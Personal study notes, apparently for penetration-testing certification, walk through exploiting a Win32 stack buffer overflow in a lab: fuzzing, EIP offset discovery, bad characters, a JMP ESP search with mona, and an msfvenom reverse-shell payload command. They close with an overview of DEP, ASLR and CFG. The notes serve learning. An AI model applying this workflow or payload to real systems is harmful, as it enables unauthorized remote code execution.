---
id: activeinformationgathering
tags: [bash, cheatsheet]
created: 2023-01-26
---
# Buffer Overflows

backlinks: [[snippets-bash]]

sources:

---

- Memory
  - Kernel
  - Stack
    - ESP (extended stack pointer) lowest memory address (top) of the stack and is dynamic based on how much memory a function needs to store data, arguments, and pointers
    - Buffer space (should be able to contain the data)
    - EBP (extended base pointer) keep track of required arguments, local variables, and the return address?
    - EIP (extended instruction pointer) / return address (THIS IS THE GOAL) storing the address of the next instruction to be executed
    - EAX used to store the results of logical instructions
  - Heap
  - Data
  - Text
  
- Process
  - Notes
    - may need to disable defender
    - run immunity debugger as admin
  - Spiking
  - Fuzzing
    - attach immunitydebugger to the process
    - send multiples of 100 A's until it crash via the fuzzying.py script
    - This will return us a count of when the process crashed
  - Finding the offset
    - with the value of the fuzzing count use the metasploit pattern create function to generate a string that will pin point the EIP
      - ``shell /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000```
    - send this buffer string and get the EIP
    ![immunity debugger EIP](kb/offsec/pen200/10-11-12-BufferOverflows/image.png)
    - using the EIP as 386F4337 we can now search using the metasploit pattern query
      - ```shell /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337```
      - ```shell [*] Exact match at offset 2003```
  - Overwrite the EIP
    - with offset=2003 we send ```"A"*2003 + "B"*4``` to ensure that BBBB is replaced as the EIP
    ![immunity debugger EIP = 42424242 = BBBB](kb/offsec/pen200/10-11-12-BufferOverflows/image-1.png)
  - Finding bad characters
    - we append the badchars string (which is a unique list of all chars) to the BBBB payload and eyeball the resulting hex values to see what broke. 
    - check EIP is still 42424242 (BBBB) then right click on ESP and select follow dump
    ![Right](kb/offsec/pen200/10-11-12-BufferOverflows/image-2.png)
    - in the hex dump there will be characters that look out of place (maybe B0 or something completely different) but these are the characters we need to exclude otherwise they will break our payload.
    ![Alt text](kb/offsec/pen200/10-11-12-BufferOverflows/image-3.png)
  - Finding the right module
    - Goal is to find a dll or a program that has no memory protection
    - Copy the mona.py file from https://github.com/corelan/mona to <"C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands">
    - In the text box in the bottom of the immunity debugger type ```shell !mona modules ```
    ![Alt text](assets/attachments/kb/offsec/pen200/10-11-12-BufferOverflows/notes/image-5.png)
    - we can see that essfunc.dll has all false protections on rebase, safeseh, aslr, mxcompat
    ![Alt text](assets/attachments/kb/offsec/pen200/10-11-12-BufferOverflows/notes/image-6.png)
    - use nasm_shell to generate a jump command JMP ESP -> FFE4
      - ```shell /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb```
    - lets find occurences of \xff\xe4 in the module and get their address spaces
      - ```shell !mona find -s "\xff\xe4" -m essfunc.dll ```
      ![Alt text](assets/attachments/kb/offsec/pen200/10-11-12-BufferOverflows/notes/image-7.png)
    - this now gives us the address pointers
      - 625011af
      - 625011bb
      - 625011c7
      - etc
    - click on the darkblue/black arrow button and enter the expression to follow - 625011af - then click F2 and set a breakpoint. So when we overflow the buffer, it will break in immunity debugger
    - run the hitthepointer(buffer) function and ensure immunity debugger breaks on that point
  - Generating shellcode
    - msfvenom
      - -p payload
      - -LHOST is our ip address because its a reverse shell
      - -LPORT is our open port
      - EXITFUNCT=thread -makes our exploit a little more stable
      - -f c -export as c lanuage
      - -a x86 architecture
      - -b bad characters     \x00 or null byte, \x0a (line feed), \x0d (carriage return)
        - eg '\x00\x0a\x0d\x20'
      - ```shell msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.1 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"```
  - Root!


- Win32 buffer overflows
  - protection mechanisms against buffer overflows
    - Data Execution Prevention (DEP) checks on memory (particularly data pages) and raises exceptions when attempts are made
    - Address Space Layout Randomisation (ASLR) randomises the base address of loaded applications every time the OS is rebooted (XP uses the same memory addresses every time)
    - Control Flow Guard (CFG) performs validation of indirect code branching preventing overwrites of function pointers
  - 